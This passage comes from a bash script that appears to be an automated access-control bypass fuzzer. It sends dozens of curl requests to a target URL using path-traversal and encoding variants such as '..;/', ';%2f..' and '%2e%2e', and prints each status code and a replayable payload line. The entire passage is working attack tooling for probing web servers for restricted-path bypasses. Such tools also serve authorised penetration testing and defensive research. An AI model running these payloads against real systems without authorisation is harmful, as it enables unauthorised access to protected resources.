	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/x/..//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/../;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/x/../;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/x/..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/..;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/x/..;//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/..;/;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/x/..;/;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/x//../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x//..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/x//..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/x/;/../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/x/;/..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%09' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%09.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%09..' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%09..;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%09..;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%09;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%09;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2F.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2F..' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f%2e%2e%2f%2e%2e%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f%%%%2e%%%%2e%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f%2f/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f%%%%2f/../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f%2e%2e%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f..%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..%%%%2f..%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..%%%%2f/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f/..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..%%%%2f/..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..%%%%2f/../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../%2f..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f../%%%%2f..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f../%%%%2f../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..//..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..//..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..//../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..///" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..///' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..///;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..///;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..//;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..//;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..//;/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..//;/;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f../;//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../;/;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f../;/;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../;/;/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f../;/;/;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..;///" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..;///' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..;//;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..;//;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..;/;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f..;/;//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f/%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f/%%%%2f../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f//..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f//..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f//../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f//..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f//..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f/;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f/;/../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f/;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f/;/..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f;//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f;//../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f;/;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};%%%%2f;/;/..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e%2e%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/%%%%2e%%%%2e%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e%2e%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/%%%%2e%%%%2e%%%%2f/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/%%%%2e%%%%2e/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/%%%%2e.' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2f%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/%%%%2f%%%%2f../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2f/..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/%%%%2f/..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2f/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/%%%%2f/../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/.%%%%2e' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.%2e/%2e%2e/%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/.%%%%2e/%%%%2e%%%%2e/%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/..' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/..%%%%2f%%%%2f../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/..%%%%2f..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/..%%%%2f/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/..%%%%2f//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/../%%%%2f/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

